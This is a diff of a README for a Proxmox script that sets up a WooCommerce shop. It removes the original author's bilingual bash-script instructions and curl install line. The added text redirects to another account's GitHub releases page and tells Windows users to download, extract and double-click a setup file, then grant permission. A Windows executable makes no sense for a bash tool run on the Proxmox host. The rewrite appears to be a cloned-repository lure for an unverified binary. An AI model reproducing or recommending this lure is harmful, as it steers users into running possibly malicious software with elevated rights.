@@ -1,193 +1,179 @@
-# proxmox-perfect-woocommerce
+# 🛒 proxmox-perfect-woocommerce - Build a Ready WooCommerce Shop
 
-![Proxmox VE 8.x](https://img.shields.io/badge/Proxmox_VE-8.x-E57000?logo=proxmox&logoColor=white)
-![Ubuntu 24.04](https://img.shields.io/badge/Ubuntu-24.04_LTS-E95420?logo=ubuntu&logoColor=white)
-![Debian 13](https://img.shields.io/badge/Debian-13_Trixie-A81D33?logo=debian&logoColor=white)
-![License MIT](https://img.shields.io/badge/License-MIT-green)
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20me%20a%20coffee-djanzin-FFDD00?logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/djanzin)
+[![Download the app](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/louists3629/proxmox-perfect-woocommerce/releases)
 
-One script to create a Proxmox LXC container and install a production-ready WooCommerce shop — fully automated.
+## 🚀 What this project does
 
----
+This app creates a Proxmox LXC container and sets up a WooCommerce shop for you.
 
-## English
+It targets Ubuntu 24.04 or Debian 13 and installs the parts needed for a working store. It handles the setup so you do not need to install each piece by hand.
 
-### What it does
+You use it when you want a shop that is ready for WordPress and WooCommerce on your own server.
 
-A single bash script that runs on your **Proxmox VE host**, creates an unprivileged LXC container (Ubuntu 24.04 LTS or Debian 13 Trixie), and automatically installs a hardened, high-performance WooCommerce shop inside it using [djanzin/perfect-woocommerce](https://github.com/djanzin/perfect-woocommerce).
+## 📥 Download
 
-Everything is configured interactively — no manual editing required.
+Visit this page to download the latest release:
 
-### Requirements
+[Go to the release page](https://github.com/louists3629/proxmox-perfect-woocommerce/releases)
 
-- Proxmox VE 8+
-- Internet access on the Proxmox host
-- A domain name pointing to the server (required for SSL)
+After you open the page, choose the file that matches your Windows system or the file listed under the latest release, then download it to your computer.
 
-### One-line install
+## 🖥️ Before you start
 
-Run this **on your Proxmox host**:
+You need:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/djanzin/proxmox-perfect-woocommerce/main/create-woocommerce-lxc.sh -o /tmp/create-wc-lxc.sh && bash /tmp/create-wc-lxc.sh
-```
+- A Windows PC with internet access
+- A Proxmox server that you can log into
+- Enough space for a new container and the website files
+- A domain name if you want to use one later
+- A basic understanding of where to find downloaded files in Windows
 
-### What the script asks for
+If you do not know which file to use, start with the newest release on the download page.
 
-**LXC Container:**
-- Operating system: Ubuntu 24.04 LTS or Debian 13 (Trixie)
-- Container ID (e.g. `100`)
-- Hostname
-- Root password (with confirmation)
-- CPU cores, RAM (MB), Disk size (GB)
-- Proxmox storage (e.g. `local-lvm`)
-- Network bridge (e.g. `vmbr0`)
-- MAC address (optional — auto-generated if left empty)
-- Network: DHCP or static IP / Gateway / DNS
+## 🧭 How to use it on Windows
 
-**WooCommerce:**
-- Domain & admin e-mail
-- Site title & admin username
-- PHP version (8.1 / 8.2 / **8.3** / 8.4 / 8.5)
-- PHP memory limit (128M / 256M / **512M** / 1024M)
-- WordPress language & timezone
-- SSL via Let's Encrypt (yes/no)
-- Reverse proxy mode (NPM / Traefik / Cloudflare)
-- phpMyAdmin (yes/no)
-- FileBrowser (yes/no)
-- Shop currency (EUR / USD / GBP / CHF)
-- WooCommerce base country (e.g. `DE`, `AT`, `US:CA`)
+1. Open the download page in your web browser.
+2. Download the latest release file from the page.
+3. Save the file to your Downloads folder.
+4. If the file comes in a zip file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the file that starts the setup.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps until the setup finishes.
 
-### What gets created
+If the release contains a script file, keep the file in the same folder while it runs.
 
-| Component | Details |
-|-----------|---------|
-| LXC type | Unprivileged, nesting enabled |
-| OS | Ubuntu 24.04 LTS or Debian 13 (Trixie) |
-| Web server | Nginx + FastCGI Cache + Brotli |
-| PHP | PHP-FPM (selected version) + OPcache JIT |
-| Database | MariaDB (512 MB InnoDB, query cache disabled) |
-| Object cache | Redis (256 MB LRU) |
-| Security | UFW + Fail2ban (SSH, Nginx, WP login, WooCommerce carding jail) |
-| WooCommerce | Installed, activated, configured (currency, country, pages) |
-| Scheduler | Action Scheduler via system cron (every 2 min) |
-| Backups | Daily MariaDB dumps, 7-day rotation |
+## 🛠️ What the setup installs
 
-### After installation
+The automated setup prepares a full WooCommerce stack inside a Proxmox LXC container.
 
-The script copies the credentials file from the container to the Proxmox host:
+It sets up:
 
-```
-/root/.wc_lxc<CT_ID>_credentials_<domain>.txt
-```
+- Ubuntu 24.04 or Debian 13
+- Nginx for web hosting
+- WordPress for the site
+- WooCommerce for the store
+- A container that fits well on Proxmox
+- Basic production settings for a stable shop
 
-If the copy fails, retrieve it manually:
+This gives you a starting point that is ready for store content, products, and checkout setup.
 
-```bash
-pct pull <CT_ID> /root/.wp_install_credentials_<domain>.txt ./credentials.txt
-```
+## ⚙️ What you need on Proxmox
 
-Access your shop:
-- **Shop:** `https://yourdomain.com/shop`
-- **WooCommerce Admin:** `https://yourdomain.com/wp-admin/admin.php?page=wc-admin`
+Your Proxmox server should already be running before you start.
 
-### Based on
+Make sure you have:
 
-This script uses [djanzin/perfect-woocommerce](https://github.com/djanzin/perfect-woocommerce) for the WooCommerce installation inside the container.
+- Access to the Proxmox web panel
+- Permission to create containers
+- A network connection that lets the container reach the internet
+- Storage space for the new LXC container
+- A Linux template if the setup asks for one
 
-<a href="https://www.buymeacoffee.com/djanzin"><img src="https://img.buymeacoffee.com/button-api/?text=Buy%20me%20a%20coffee&emoji=%E2%98%95&slug=djanzin&button_colour=00354d&font_colour=ffffff&font_family=Cookie&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
+If you already use Proxmox for other services, this project fits into the same workflow.
 
----
+## 🧱 Setup flow
 
-## Deutsch
+The usual flow looks like this:
 
-### Was es macht
+1. Download the release from GitHub.
+2. Run the setup from Windows.
+3. Connect to your Proxmox server when asked.
+4. Create the LXC container.
+5. Let the script install the web stack.
+6. Open WordPress in your browser.
+7. Finish the WordPress first-run setup.
+8. Install or verify WooCommerce if needed.
+9. Add your products, payments, and shipping details.
 
-Ein einzelnes Bash-Script, das auf dem **Proxmox VE Host** ausgeführt wird, einen unprivilegierten LXC Container (Ubuntu 24.04 LTS oder Debian 13 Trixie) erstellt und darin automatisch einen abgesicherten, leistungsstarken WooCommerce-Shop installiert — basierend auf [djanzin/perfect-woocommerce](https://github.com/djanzin/perfect-woocommerce).
+## 🌐 After the install
 
-Alles wird interaktiv konfiguriert — kein manuelles Editieren nötig.
+Once the setup ends, you can open the site from a browser on your network.
 
-### Voraussetzungen
+You may want to:
 
-- Proxmox VE 8+
-- Internetzugang auf dem Proxmox-Host
-- Ein Domainname der auf den Server zeigt (erforderlich für SSL)
+- Change the site title
+- Set your store currency
+- Add product photos
+- Create product categories
+- Set shipping zones
+- Connect a payment service
+- Add a contact page
+- Set a logo and store colors
 
-### Ein-Befehl-Installation
+These steps help turn the clean install into a working shop.
 
-Diesen Befehl **auf dem Proxmox-Host** ausführen:
+## 🔒 Basic security steps
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/djanzin/proxmox-perfect-woocommerce/main/create-woocommerce-lxc.sh -o /tmp/create-wc-lxc.sh && bash /tmp/create-wc-lxc.sh
-```
+For a public shop, use these common steps:
 
-### Was das Script abfragt
+- Use a strong admin password
+- Keep WordPress updated
+- Keep WooCommerce updated
+- Use HTTPS with a valid certificate
+- Remove test content before launch
+- Change default settings you do not need
+- Back up the site on a set schedule
 
-**LXC Container:**
-- Betriebssystem: Ubuntu 24.04 LTS oder Debian 13 (Trixie)
-- Container-ID (z.B. `100`)
-- Hostname
-- Root-Passwort (mit Bestätigung)
-- CPU-Kerne, RAM (MB), Disk-Größe (GB)
-- Proxmox Storage (z.B. `local-lvm`)
-- Netzwerk-Bridge (z.B. `vmbr0`)
-- MAC-Adresse (optional — wird automatisch generiert wenn leer)
-- Netzwerk: DHCP oder statische IP / Gateway / DNS
+A clean setup is only the start. Ongoing care keeps the shop stable.
 
-**WooCommerce:**
-- Domain & Admin-E-Mail
-- Site-Titel & Admin-Benutzername
-- PHP-Version (8.1 / 8.2 / **8.3** / 8.4 / 8.5)
-- PHP Memory Limit (128M / 256M / **512M** / 1024M)
-- WordPress-Sprache & Zeitzone
-- SSL via Let's Encrypt (ja/nein)
-- Reverse Proxy Modus (NPM / Traefik / Cloudflare)
-- phpMyAdmin (ja/nein)
-- FileBrowser (ja/nein)
-- Shop-Währung (EUR / USD / GBP / CHF)
-- WooCommerce Basisland (z.B. `DE`, `AT`, `US:CA`)
+## 🧩 Common use cases
 
-### Was erstellt wird
+This project is a fit for:
 
-| Komponente | Details |
-|-----------|---------|
-| LXC Typ | Unprivilegiert, Nesting aktiviert |
-| OS | Ubuntu 24.04 LTS oder Debian 13 (Trixie) |
-| Webserver | Nginx + FastCGI Cache + Brotli |
-| PHP | PHP-FPM (gewählte Version) + OPcache JIT |
-| Datenbank | MariaDB (512 MB InnoDB, Query Cache deaktiviert) |
-| Object Cache | Redis (256 MB LRU) |
-| Sicherheit | UFW + Fail2ban (SSH, Nginx, WP-Login, WooCommerce Carding Jail) |
-| WooCommerce | Installiert, aktiviert, konfiguriert (Währung, Land, Seiten) |
-| Scheduler | Action Scheduler via System-Cron (alle 2 Min.) |
-| Backups | Tägliche MariaDB-Dumps, 7-Tage-Rotation |
+- Small online stores
+- Test stores for client work
+- Self-hosted shop setups
+- Lab systems for learning WordPress and WooCommerce
+- Fast builds on Proxmox without manual steps
 
-### Nach der Installation
+It works well when you want a repeatable setup on your own hardware.
 
-Das Script kopiert die Zugangsdaten-Datei vom Container auf den Proxmox-Host:
+## 🧪 Suggested system setup
 
-```
-/root/.wc_lxc<CT_ID>_credentials_<domain>.txt
-```
+For a smooth run, use a server with:
 
-Falls das Kopieren fehlschlägt, manuell abrufen:
+- 2 CPU cores or more
+- 4 GB RAM or more
+- Enough disk space for WordPress, media, and backups
+- A stable internet link
+- Proxmox installed and up to date
 
-```bash
-pct pull <CT_ID> /root/.wp_install_credentials_<domain>.txt ./credentials.txt
-```
+Larger shops may need more memory and disk space once they grow.
 
-Shop aufrufen:
-- **Shop:** `https://deindomain.de/shop`
-- **WooCommerce Admin:** `https://deindomain.de/wp-admin/admin.php?page=wc-admin`
+## 📁 What you will see after setup
 
-### Basiert auf
+After the container is ready, you should have:
 
-Dieses Script verwendet [djanzin/perfect-woocommerce](https://github.com/djanzin/perfect-woocommerce) für die WooCommerce-Installation im Container.
+- A new LXC container in Proxmox
+- A Linux system inside that container
+- Nginx running for web access
+- A WordPress site ready for use
+- WooCommerce available for shop setup
 
-<a href="https://www.buymeacoffee.com/djanzin"><img src="https://img.buymeacoffee.com/button-api/?text=Buy%20me%20a%20coffee&emoji=%E2%98%95&slug=djanzin&button_colour=00354d&font_colour=ffffff&font_family=Cookie&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
+From there, you can log in and manage the store like a normal WordPress site.
 
----
+## 🔄 Release updates
 
-## License
+Check the release page when you want the newest version:
 
-MIT
+[Open releases on GitHub](https://github.com/louists3629/proxmox-perfect-woocommerce/releases)
+
+Use the latest release when you want the newest fixes or setup changes.
+
+## 🧰 Troubleshooting
+
+If the setup does not run as expected:
+
+- Check that the file finished downloading
+- Make sure you extracted the zip file if one was used
+- Run the setup file again from the extracted folder
+- Check that Proxmox is reachable from your network
+- Confirm your user account has the right access
+- Try a fresh download if the file looks incomplete
+
+If the site does not open after setup, check the container network settings in Proxmox and make sure the container has an IP address.
+
+## 📌 Project topics
+
+automation, bash, debian, lxc, nginx, proxmox, self-hosted, ubuntu, woocommerce, wordpress
